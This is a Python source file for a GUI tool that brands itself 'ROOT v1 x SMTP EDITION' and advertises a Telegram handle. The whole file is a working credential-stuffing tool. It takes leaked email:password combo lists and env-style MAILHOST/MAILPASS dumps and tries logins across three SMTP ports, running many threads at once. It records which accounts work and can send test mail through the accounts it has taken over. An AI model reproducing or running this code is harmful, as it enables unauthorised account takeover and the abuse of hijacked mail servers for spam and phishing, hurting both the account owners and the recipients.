import smtplib
import tkinter as tk
from tkinter import filedialog, messagebox
import logging
import traceback
import os
import datetime
from colorama import init, Fore, Style
import concurrent.futures
import socket

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def print_banner():
    banner = f"""
{Fore.GREEN}
 ██████╗     ███╗   ███╗ ████████╗ ███████╗
██╔════╝     ████╗ ████║ ╚══██╔══╝ ██╔═══██╗
███████╗     ██╔████╔██║    ██║    █████╗  
╚════██║     ██║╚██╔╝██║    ██║    ██╔══╝  
██████╔╝     ██║ ╚═╝ ██║    ██║    ██
╚═════╝      ╚═╝     ╚═╝    ╚═╝    ╚═


{Style.RESET_ALL}{Fore.GREEN}Telegram: @rootbck{Style.RESET_ALL}
    """
    print(banner)

def check_smtp(smtp_server, port, username, password, retry=False):
    try:
        smtp_conn = smtplib.SMTP(smtp_server, port, timeout=10)
        smtp_conn.ehlo()
        smtp_conn.starttls()
        smtp_conn.login(username, password)
        status = smtp_conn.noop()[0]
        smtp_conn.quit()
        return status == 250
    except smtplib.SMTPAuthenticationError:
        result = f"{smtp_server}|{port}|{username}|{password}"
        print(Fore.RED + f"[ROOT v1 x SMTP EDITION] {result} [INVALID CREDENTIALS]")
    except smtplib.SMTPException:
        result = f"{smtp_server}|{port}|{username}|{password}"
        print(Fore.RED + f"[ROOT v1 x SMTP EDITION] {result} [CONNECTION ERROR]")
    except socket.gaierror:
        if not retry:
            retry_smtp_server = smtp_server.replace("smtp.", "")
            return check_smtp(retry_smtp_server, port, username, password, retry=True)
        else:
            result = f"{smtp_server}|{port}|{username}|{password}"
            print(Fore.RED + f"[ROOT v1 x SMTP EDITION] {result} [INVALID SERVER]")
    except Exception:
        result = f"{smtp_server}|{port}|{username}|{password}"
        print(Fore.RED + f"[ROOT v1 x SMTP EDITION] {result} [UNEXPECTED ERROR]")
        logging.error("Unexpected error for %s: %s", username, traceback.format_exc())
    return False

def send_test_email(smtp_server, port, username, password, recipient, retry=False):
    try:
        subject = "Root SMTP Test"
        body = "This email is from Root. SMTP is valid."
        message = f"Subject: {subject}\n\n{body}"

        with smtplib.SMTP(smtp_server, port, timeout=10) as server:
            server.starttls()
            server.login(username, password)
            server.sendmail(username, recipient, message)
        return True
    except smtplib.SMTPException:
        result = f"{smtp_server}|{port}|{username}|{password}"
        print(Fore.RED + f"[ROOT v1 x SMTP EDITION] {result} [CONNECTION ERROR]")
    except socket.gaierror:
        if not retry:
            retry_smtp_server = smtp_server.replace("smtp.", "")
            return send_test_email(retry_smtp_server, port, username, password, recipient, retry=True)
        else:
            result = f"{smtp_server}|{port}|{username}|{password}"
            print(Fore.RED + f"[ROOT v1 x SMTP EDITION] {result} [INVALID SERVER]")
    except Exception:
        result = f"{smtp_server}|{port}|{username}|{password}"
        print(Fore.RED + f"[ROOT v1 x SMTP EDITION] {result} [UNEXPECTED ERROR]")
        logging.error("Unexpected error when sending email from %s: %s", username, traceback.format_exc())
    return False

def get_smtp_from_email(email):
    domain = email.split('@')[-1]
    return f"smtp.{domain}"

def save_results(filename, data):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, 'a') as file:
        file.write(data + '\n')

def check_smtp_combolist_line(line):
    try:
        email, password = line.strip().split(':')
    except ValueError:
        logging.error("Invalid format for combo list line: %s", line.strip())
        return line, False

    smtp_server = get_smtp_from_email(email)
    for port in [25, 465, 587]:
        if check_smtp(smtp_server, port, email, password):
            result = f"{smtp_server}|{port}|{email}|{password}"
            print(Fore.GREEN + f"[ROOT v1 x SMTP EDITION] {result} [VALID]")
            return result, True
        else:
            result = f"{smtp_server}|{port}|{email}|{password}"
    return line, False

def check_smtp_combolist(file_path, max_threads):
    valid_filename = f'results/validsmtp_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    invalid_filename = f'results/invalidsmtp_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
    except Exception as e:
        logging.error("Error reading file %s: %s", file_path, str(e))
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(check_smtp_combolist_line, line) for line in lines]
        for future in concurrent.futures.as_completed(futures):
            line, is_valid = future.result()
            if is_valid:
                save_results(valid_filename, line)
            else:
                save_results(invalid_filename, line)

def check_smtp_file_line(line):
    try:
        smtp_server, port, username, password = line.strip().split('|')
    except ValueError:
        logging.error("Invalid format for SMTP file line: %s", line.strip())
        return line, False

    for port in [25, 465, 587]:
        if check_smtp(smtp_server, port, username, password):
            result = f"{smtp_server}|{port}|{username}|{password}"
            print(Fore.GREEN + f"[ROOT v1 x SMTP EDITION] {result} [VALID]")
            return result, True
        else:
            result = f"{smtp_server}|{port}|{username}|{password}"
    return line, False

def check_smtp_file(file_path, max_threads):
    valid_filename = f'results/validsmtp_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    invalid_filename = f'results/invalidsmtp_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
    except Exception as e:
        logging.error("Error reading file %s: %s", file_path, str(e))
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(check_smtp_file_line, line) for line in lines]
        for future in concurrent.futures.as_completed(futures):
            line, is_valid = future.result()
            if is_valid:
                save_results(valid_filename, line)
            else:
                save_results(invalid_filename, line)

def check_send_smtp_line(line, recipient):
    if '|' in line:
        try:
            smtp_server, port, username, password = line.strip().split('|')
        except ValueError:
            logging.error("Invalid format for SMTP file line: %s", line.strip())
            return line, False
    else:
        parts = line.strip().split('\n')
        smtp_server = [p.split(': ')[1] for p in parts if 'MAILHOST' in p][0]
        port = int([p.split(': ')[1] for p in parts if 'MAILPORT' in p][0])
        username = [p.split(': ')[1] for p in parts if 'MAILUSER' in p][0]
        password = [p.split(': ')[1] for p in parts if 'MAILPASS' in p][0]

    for port in [25, 465, 587]:
        if send_test_email(smtp_server, port, username, password, recipient):
            result = f"{smtp_server}|{port}|{username}|{password}"
            print(Fore.GREEN + f"[ROOT v1 x SMTP EDITION] {result} [VALID]")
            return result, True
        else:
            result = f"{smtp_server}|{port}|{username}|{password}"
    return line, False

def check_send_smtp(file_path, recipient, max_threads):
    valid_filename = f'results/send/validsend_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    invalid_filename = f'results/send/invalidsend_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
    except Exception as e:
        logging.error("Error reading file %s: %s", file_path, str(e))
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(check_send_smtp_line, line, recipient) for line in lines]
        for future in concurrent.futures.as_completed(futures):
            line, is_valid = future.result()
            if is_valid:
                save_results(valid_filename, line)
            else:
                save_results(invalid_filename, line)

def gui():
    root = tk.Tk()
    root.title("SMTP Checker")
    root.geometry("400x300")

    def open_file():
        file_path = filedialog.askopenfilename(title="Select File", filetypes=[('Text Files', '*.txt')])
        return file_path

    def check_combolist():
        file_path = open_file()
        if file_path:
            max_threads = threads_entry.get()
            max_threads = int(max_threads) if max_threads else 100
            check_smtp_combolist(file_path, max_threads)

    def check_smtp_file_gui():
        file_path = open_file()
        if file_path:
            max_threads = threads_entry.get()
            max_threads = int(max_threads) if max_threads else 100
            check_smtp_file(file_path, max_threads)

    def test_send_file():
        file_path = open_file()
        if file_path:
            recipient = recipient_entry.get().strip()
            if recipient:
                max_threads = threads_entry.get()
                max_threads = int(max_threads) if max_threads else 100
                check_send_smtp(file_path, recipient, max_threads)
            else:
                messagebox.showerror("Error", "Please enter a recipient email address.")

    # Add widgets
    tk.Label(root, text="SMTP Checker", font=("Helvetica", 16)).pack(pady=10)
    tk.Label(root, text="telegram: @rootbck", font=("Helvetica", 16)).pack(pady=10)
    tk.Label(root, text="Number of Threads (default is 100):").pack(pady=5)
    threads_entry = tk.Entry(root)
    threads_entry.pack(pady=5)
    tk.Label(root, text="Recipient Email for Send Test:").pack(pady=5)
    recipient_entry = tk.Entry(root)
    recipient_entry.pack(pady=5)

    tk.Button(root, text="Check SMTP from Combo List", command=check_combolist).pack(pady=5)
    tk.Button(root, text="Check SMTP from Text File", command=check_smtp_file_gui).pack(pady=5)
    tk.Button(root, text="Test Send from Text File", command=test_send_file).pack(pady=5)

    root.mainloop()

if __name__ == '__main__':
    print_banner()
    gui()
